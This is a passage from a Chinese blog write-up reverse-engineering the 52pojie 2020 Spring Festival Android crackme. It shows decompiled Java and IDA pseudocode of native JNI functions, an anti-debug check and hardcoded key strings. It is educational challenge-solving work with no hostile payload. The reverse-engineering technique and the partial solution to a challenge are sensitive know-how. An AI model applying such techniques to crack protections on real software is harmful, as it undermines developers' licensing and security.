class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wuaipojie.crackme01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_click;</span><br><span class="line">    <span class="keyword">private</span> EditText editText;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">checkFlag</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">/* JADX: method processing error */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: java.lang.NullPointerException</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.searchTryCatchDominators(ProcessTryCatchRegions.java:75)</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.process(ProcessTryCatchRegions.java:45)</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.regions.RegionMakerVisitor.postProcessRegions(RegionMakerVisitor.java:63)</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:58)</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)</span></span><br><span class="line"><span class="comment">at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)</span></span><br><span class="line"><span class="comment">at jadx.core.ProcessClass.process(ProcessClass.java:37)</span></span><br><span class="line"><span class="comment">at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:280)</span></span><br><span class="line"><span class="comment">at jadx.api.JavaClass.decompile(JavaClass.java:62)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        r0 = "crack_j2c"; Catch:&#123; UnsatisfiedLinkError -&gt; 0x0005 &#125;</span></span><br><span class="line"><span class="comment">        java.lang.System.loadLibrary(r0); Catch:&#123; UnsatisfiedLinkError -&gt; 0x0005 &#125;</span></span><br><span class="line"><span class="comment">    L_0x0005:</span></span><br><span class="line"><span class="comment">        return;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Method not decompiled: com.wuaipojie.crackme01.MainActivity.&lt;clinit&gt;():void"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.editText = (EditText) findViewById(R.id.input_flag);</span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="keyword">this</span>.btn_click = button;</span><br><span class="line">        button.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数，<code>onCreate()</code> 在 Java 层中实现，可以看出整个界面中有一个文本框和一个按钮，并设置了一个按钮的监听事件，即 onClick；<code>onClick()</code> 和 <code>checkFlag()</code> 可以看到是在 Native 层进行实现的，可以从 lib 文件夹中找到 so 文件，接下来用 IDA 对 so 中的两个函数进行分析。导入 IDA 后，通过函数名可以看出两个函数通过静态注册：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/9.png" alt="Native函数通过静态注册"></p><p>然后先来看 onClick 函数。这边略过一些导入 jni.h 等一些分析的过程（一般静态注册函数的第一个参数是 JNIEnv 等等），在分析的过程中大致猜测出两个函数 <code>sub_5288</code> 和 <code>sub_539C</code> 两个函数分别用来获取指定的方法（getMethod）或者是域（getField）。接下来直接来看分析过后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_wuaipojie_crackme01_MainActivity_onClick__Landroid_view_View_2</span><span class="params">(_JNIEnv *env, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *env_; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r5</span></span><br><span class="line">  jstring (__cdecl *v8)(JNIEnv *, <span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v15; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  JNINativeMethod method; <span class="comment">// [sp+4h] [bp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [sp+10h] [bp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [sp+14h] [bp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+18h] [bp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [sp+1Ch] [bp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [sp+20h] [bp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [sp+24h] [bp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> a3a; <span class="comment">// [sp+28h] [bp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [sp+2Ch] [bp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [sp+30h] [bp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [sp+34h] [bp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [sp+38h] [bp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> a2a; <span class="comment">// [sp+3Ch] [bp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [sp+40h] [bp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+48h] [bp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+50h] [bp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [sp+58h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  env_ = env;</span><br><span class="line">  v4 = a3;</span><br><span class="line">  a2a = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  a3a = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  method.fnPtr = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v5 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env-&gt;functions-&gt;NewLocalRef)(env, a2);</span><br><span class="line">  v6 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;NewLocalRef)(env_, v4);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  v7 = v6;</span><br><span class="line">  method.name = <span class="string">"editText"</span>;</span><br><span class="line">  method.signature = <span class="string">"Landroid/widget/EditText;"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getFields(env_, &amp;a2a, &amp;a3a, <span class="number">0</span>, <span class="string">"com/wuaipojie/crackme01/MainActivity"</span>, method) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  v9 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>))env_-&gt;functions-&gt;GetObjectField)(env_, v5, a3a);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  <span class="keyword">if</span> ( !v25 )</span><br><span class="line">  &#123;</span><br><span class="line">    method.name = <span class="string">"getText"</span>;</span><br><span class="line">    method.signature = <span class="string">"()Landroid/text/Editable;"</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getMethods(env_, &amp;v30, &amp;v25, <span class="number">0</span>, <span class="string">"android/widget/EditText"</span>, method) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v9);<span class="comment">// get input string</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v9);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  <span class="keyword">if</span> ( !v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    method.name = <span class="string">"toString"</span>;</span><br><span class="line">    method.signature = <span class="string">"()Ljava/lang/String;"</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getMethods(env_, &amp;v29, &amp;v24, <span class="number">0</span>, <span class="string">"java/lang/Object"</span>, method) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v10);<span class="comment">// convert object to string</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v10);</span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  <span class="keyword">if</span> ( !v23 )</span><br><span class="line">  &#123;</span><br><span class="line">    method.name = <span class="string">"trim"</span>;</span><br><span class="line">    method.signature = <span class="string">"()Ljava/lang/String;"</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getMethods(env_, &amp;v28, &amp;v23, <span class="number">0</span>, <span class="string">"java/lang/String"</span>, method) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v11);<span class="comment">// trim string</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v11);</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    method.name = <span class="string">"length"</span>;</span><br><span class="line">    method.signature = <span class="string">"()I"</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getMethods(env_, &amp;v28, &amp;v22, <span class="number">0</span>, <span class="string">"java/lang/String"</span>, method) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  len = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallIntMethodA)(env_, v12);<span class="comment">// get string's length</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  <span class="keyword">if</span> ( len == <span class="number">30</span> )                              <span class="comment">// len(flag) == 30</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      method.name = <span class="string">"checkFlag"</span>;</span><br><span class="line">      method.signature = <span class="string">"(Ljava/lang/String;)Z"</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getMethods(env_, &amp;a2a, &amp;v21, <span class="number">0</span>, <span class="string">"com/wuaipojie/crackme01/MainActivity"</span>, method) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">    v32 = v12;</span><br><span class="line">    v14 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v5);<span class="comment">// invoke checkFlag method</span></span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);</span><br><span class="line">    v8 = env_-&gt;functions-&gt;NewStringUTF;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">    v15 = <span class="string">"正确！！！回复你输入的内容到吾爱破解论坛公众号"</span>;            <span class="comment">// correct</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);</span><br><span class="line">    v15 = <span class="string">"flag长度必须为30位"</span>;                       <span class="comment">// flag's length must equal to 30</span></span><br><span class="line">    v8 = env_-&gt;functions-&gt;NewStringUTF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">const</span> <span class="keyword">char</span> *))v8)(env_, v15);</span><br><span class="line">    <span class="keyword">if</span> ( v20</span><br><span class="line">      || (method.name = <span class="string">"makeText"</span>,</span><br><span class="line">          method.signature = <span class="string">"(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;"</span>,</span><br><span class="line">          !getMethods(env_, &amp;v27, &amp;v20, <span class="number">1</span>, <span class="string">"android/widget/Toast"</span>, method)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v33 = v16;</span><br><span class="line">      v32 = v5;</span><br><span class="line">      v34 = <span class="number">0</span>;</span><br><span class="line">      v17 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v27);</span><br><span class="line">      <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v16);</span><br><span class="line">        <span class="keyword">if</span> ( v17 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( method.fnPtr</span><br><span class="line">            || (method.name = <span class="string">"show"</span>,</span><br><span class="line">                method.signature = <span class="string">"()V"</span>,</span><br><span class="line">                !getMethods(env_, &amp;v27, (<span class="keyword">int</span> *)&amp;method.fnPtr, <span class="number">0</span>, <span class="string">"android/widget/Toast"</span>, method)) )</span><br><span class="line">          &#123;</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallVoidMethodA)(env_, v17);</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">LABEL_38:</span><br><span class="line">          sub_4EC0(env_, <span class="string">"java/lang/NullPointerException"</span>, <span class="string">"NullPointerException"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_39:</span><br><span class="line">    result = _stack_chk_guard - v35;</span><br><span class="line">    <span class="keyword">if</span> ( _stack_chk_guard == v35 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_40:</span><br><span class="line">    v15 = <span class="string">"验证错误，继续加油"</span>;                          <span class="comment">// wrong</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onClick 函数中的内容主要为在点击按钮后获取输入内容，并判断输入的字符串长度是否为 30，然后调用 checkFlag 函数对字符串进行判断。接下来再看看 checkFlag 函数，这个函数比较长，分成几段来看。首先调用了 <code>isDebuggerConnected()</code> 函数，猜测应该是用来反调试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">method1.name = <span class="string">"isDebuggerConnected"</span>;</span><br><span class="line">method1.signature = <span class="string">"()Z"</span>;</span><br><span class="line"><span class="keyword">if</span> ( !getMethods(env_, &amp;jclass, &amp;jmethodid, <span class="number">1</span>, <span class="string">"android/os/Debug"</span>, method1) )<span class="comment">// anti-debug??</span></span><br><span class="line">&#123;</span><br><span class="line">  t1 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;t_;</span><br><span class="line">  v8 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span> *))env_-&gt;functions-&gt;CallStaticBooleanMethodA)(</span><br><span class="line">         env_,</span><br><span class="line">         jclass,</span><br><span class="line">         jmethodid,</span><br><span class="line">         &amp;t_);</span><br><span class="line">  <span class="keyword">if</span> ( !(((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) | v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    key1 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">signed</span> <span class="keyword">int</span>))env_-&gt;functions-&gt;NewByteArray)(env_, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来将一串字符串分成三部分（key1 = “thisiskey”，key2 = “52pojie_2020_happy_chinese_new_year”，key3 = “20200125”）并分给了三个变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line">((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, _DWORD, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))env_-&gt;functions-&gt;SetByteArrayRegion)(</span><br><span class="line">  env_,</span><br><span class="line">  key1,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">9</span>,</span><br><span class="line">  <span class="string">"thisiskey52pojie_2020_happy_chinese_new_year20200125"</span>);<span class="comment">// key1 = "thisiskey"</span></span><br><span class="line">key2 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">signed</span> <span class="keyword">int</span>))env_-&gt;functions-&gt;NewByteArray)(env_, <span class="number">35</span>);</span><br><span class="line"><span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">&#123;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, _DWORD, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">char</span> *))env_-&gt;functions-&gt;SetByteArrayRegion)(</span><br><span class="line">    env_,</span><br><span class="line">    key2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span 